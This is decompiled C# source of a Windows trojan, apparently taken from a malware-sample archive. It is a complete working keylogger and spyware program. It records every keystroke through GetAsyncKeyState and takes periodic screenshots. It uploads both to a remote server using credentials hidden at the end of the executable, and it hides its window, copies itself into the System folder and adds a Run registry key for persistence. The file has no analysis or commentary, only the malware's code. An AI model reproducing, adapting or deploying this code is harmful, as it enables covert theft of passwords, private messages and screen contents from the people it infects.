// Decompiled with JetBrains decompiler
// Type: file.file
// Assembly: file, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 52F53CA5-02CF-49C7-AC4D-53CC5ADAB50E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Inject.ggvy-c44627f68c2098e2268239ddc9510f5bf4cbf1ac3c87b09daa0b479f910f7b7e.exe

using file.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Compatibility.VB6;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace file
{
  [DesignerGenerated]
  public class file : Form
  {
    private IContainer components;
    [AccessedThroughProperty("RichTextBox1")]
    private RichTextBox _RichTextBox1;
    [AccessedThroughProperty("cmdsendlogs")]
    private Button _cmdsendlogs;
    [AccessedThroughProperty("timerlog")]
    private Timer _timerlog;
    [AccessedThroughProperty("lognumertxt")]
    private TextBox _lognumertxt;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Timerscreen")]
    private Timer _Timerscreen;
    [AccessedThroughProperty("Timersendlogs")]
    private Timer _Timersendlogs;
    private string config;
    private int result;
    private string file;
    private string[] cmd;
    private FixedLengthString options;

    public file()
    {
      this.Load += new EventHandler(this.file_Load);
      this.config = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\configurationWin.ini";
      this.options = new FixedLengthString(100);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.RichTextBox1 = new RichTextBox();
      this.cmdsendlogs = new Button();
      this.timerlog = new Timer(this.components);
      this.lognumertxt = new TextBox();
      this.Button1 = new Button();
      this.Timerscreen = new Timer(this.components);
      this.Timersendlogs = new Timer(this.components);
      this.SuspendLayout();
      this.RichTextBox1.Dock = DockStyle.Top;
      RichTextBox richTextBox1_1 = this.RichTextBox1;
      Point point1 = new Point(0, 0);
      Point point2 = point1;
      richTextBox1_1.Location = point2;
      this.RichTextBox1.Name = "RichTextBox1";
      RichTextBox richTextBox1_2 = this.RichTextBox1;
      Size size1 = new Size(443, 260);
      Size size2 = size1;
      richTextBox1_2.Size = size2;
      this.RichTextBox1.TabIndex = 0;
      this.RichTextBox1.Text = "";
      Button cmdsendlogs1 = this.cmdsendlogs;
      point1 = new Point(12, 266);
      Point point3 = point1;
      cmdsendlogs1.Location = point3;
      this.cmdsendlogs.Name = "cmdsendlogs";
      Button cmdsendlogs2 = this.cmdsendlogs;
      size1 = new Size(75, 23);
      Size size3 = size1;
      cmdsendlogs2.Size = size3;
      this.cmdsendlogs.TabIndex = 1;
      this.cmdsendlogs.Text = "sende logs";
      this.cmdsendlogs.UseVisualStyleBackColor = true;
      TextBox lognumertxt1 = this.lognumertxt;
      point1 = new Point(113, 269);
      Point point4 = point1;
      lognumertxt1.Location = point4;
      this.lognumertxt.Name = "lognumertxt";
      this.lognumertxt.ReadOnly = true;
      TextBox lognumertxt2 = this.lognumertxt;
      size1 = new Size(308, 20);
      Size size4 = size1;
      lognumertxt2.Size = size4;
      this.lognumertxt.TabIndex = 3;
      this.lognumertxt.Text = "0";
      Button button1_1 = this.Button1;
      point1 = new Point(12, 295);
      Point point5 = point1;
      button1_1.Location = point5;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size5 = size1;
      button1_2.Size = size5;
      this.Button1.TabIndex = 4;
      this.Button1.Text = "sende bild";
      this.Button1.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(443, 323);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.lognumertxt);
      this.Controls.Add((Control) this.cmdsendlogs);
      this.Controls.Add((Control) this.RichTextBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (file);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual RichTextBox RichTextBox1
    {
      [DebuggerNonUserCode] get => this._RichTextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._RichTextBox1 = value;
    }

    internal virtual Button cmdsendlogs
    {
      [DebuggerNonUserCode] get => this._cmdsendlogs;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.cmdsendlogs_Click);
        if (this._cmdsendlogs != null)
          this._cmdsendlogs.Click -= eventHandler;
        this._cmdsendlogs = value;
        if (this._cmdsendlogs == null)
          return;
        this._cmdsendlogs.Click += eventHandler;
      }
    }

    internal virtual Timer timerlog
    {
      [DebuggerNonUserCode] get => this._timerlog;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.timerlog_Tick);
        if (this._timerlog != null)
          this._timerlog.Tick -= eventHandler;
        this._timerlog = value;
        if (this._timerlog == null)
          return;
        this._timerlog.Tick += eventHandler;
      }
    }

    internal virtual TextBox lognumertxt
    {
      [DebuggerNonUserCode] get => this._lognumertxt;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._lognumertxt = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Timer Timerscreen
    {
      [DebuggerNonUserCode] get => this._Timerscreen;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timerscreen_Tick);
        if (this._Timerscreen != null)
          this._Timerscreen.Tick -= eventHandler;
        this._Timerscreen = value;
        if (this._Timerscreen == null)
          return;
        this._Timerscreen.Tick += eventHandler;
      }
    }

    internal virtual Timer Timersendlogs
    {
      [DebuggerNonUserCode] get => this._Timersendlogs;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timersendlogs_Tick);
        if (this._Timersendlogs != null)
          this._Timersendlogs.Tick -= eventHandler;
        this._Timersendlogs = value;
        if (this._Timersendlogs == null)
          return;
        this._Timersendlogs.Tick += eventHandler;
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vKey);

    private void cmdsendlogs_Click(object sender, EventArgs e)
    {
      string str1 = this.cmd[0];
      string userName = this.cmd[1];
      string password = this.cmd[2];
      this.lognumertxt.Text = Conversions.ToString(Conversions.ToDouble(this.lognumertxt.Text) + 1.0);
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\";
      string str3 = Environment.UserName.ToString() + "-" + Environment.MachineName.ToString() + "(LogNr." + this.lognumertxt.Text + ").log";
      string str4 = str2 + str3;
      string str5 = DateTime.Now.ToString();
      File.WriteAllText(str4, "Easy Keylogger [Public] by *Poison&Ivy*\r\n" + str5 + "\r\n\r\n" + this.RichTextBox1.Text);
      MyProject.Computer.Network.UploadFile(str4, str1 + str3, userName, password, false, 100000000);
      File.Delete(this.config);
      File.WriteAllText(this.config, this.lognumertxt.Text);
      File.Delete(str4);
      this.RichTextBox1.Text = "";
    }

    private void file_Load(object sender, EventArgs e)
    {
      string executablePath1 = Application.ExecutablePath;
      string str1 = executablePath1.Substring(0, executablePath1.IndexOf(".")) + "2.exe";
      if (!File.Exists(executablePath1))
        ProjectData.EndApp();
      File.Copy(executablePath1, str1);
      FileSystem.FileOpen(1, str1, OpenMode.Binary);
      FixedLengthString options = this.options;
      string str2 = options.Value;
      FileSystem.FileGet(1, ref str2, checked (FileSystem.LOF(1) - 99L));
      options.Value = str2;
      FileSystem.FileClose(1);
      this.cmd = this.options.Value.Split('#');
      File.Delete(str1);
      string str3 = this.cmd[5];
      string str4 = this.cmd[0];
      string str5 = this.cmd[1];
      string str6 = this.cmd[2];
      string executablePath2 = Application.ExecutablePath;
      string directoryPath = MyProject.Application.Info.DirectoryPath;
      string str7 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + str3;
      Environment.GetFolderPath(Environment.SpecialFolder.System);
      if (!File.Exists(str7) && Operators.CompareString(executablePath2, str7, false) != 0)
      {
        File.Copy(executablePath2, str7);
        this.RegisterApplication(this.cmd[6], str7);
        Interaction.Shell(str7, AppWinStyle.Hide);
        this.Close();
      }
      if (File.Exists(this.config))
        this.lognumertxt.Text = File.ReadAllText(this.config);
      this.Timerscreen.Interval = Conversions.ToInteger(this.cmd[3]);
      this.Timerscreen.Start();
      this.Timersendlogs.Interval = Conversions.ToInteger(this.cmd[4]);
      this.Timersendlogs.Start();
      this.timerlog.Interval = 1;
      this.timerlog.Start();
    }

    private void timerlog_Tick(object sender, EventArgs e)
    {
      int num = 1;
      do
      {
        this.result = 0;
        this.result = file.file.GetAsyncKeyState((long) num);
        if (this.result == -32767)
          this.RichTextBox1.Text += Conversions.ToString(Strings.Chr(num));
        checked { ++num; }
      }
      while (num <= (int) byte.MaxValue);
    }

    private bool RegisterApplication(string AppName, string dateipfad)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
      if (registryKey.GetValue(AppName) != null)
        return false;
      registryKey.SetValue(AppName, (object) dateipfad);
      registryKey.Close();
      return true;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      string str1 = this.cmd[0];
      string userName = this.cmd[1];
      string password = this.cmd[2];
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      System.Drawing.Bitmap bitmap = new System.Drawing.Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      string str2 = Environment.UserName.ToString() + "-" + Environment.MachineName.ToString() + "(BildNr." + this.lognumertxt.Text + ").jpeg";
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + str2;
      graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      bitmap.Save(str3);
      MyProject.Computer.Network.UploadFile(str3, str1 + str2, userName, password, false, 100000000);
      File.Delete(str3);
    }

    private void Timerscreen_Tick(object sender, EventArgs e) => this.Button1_Click((object) this.AcceptButton, (EventArgs) this.AcceptButton);

    private void Timersendlogs_Tick(object sender, EventArgs e) => this.cmdsendlogs_Click((object) this.AcceptButton, (EventArgs) this.AcceptButton);
  }
}
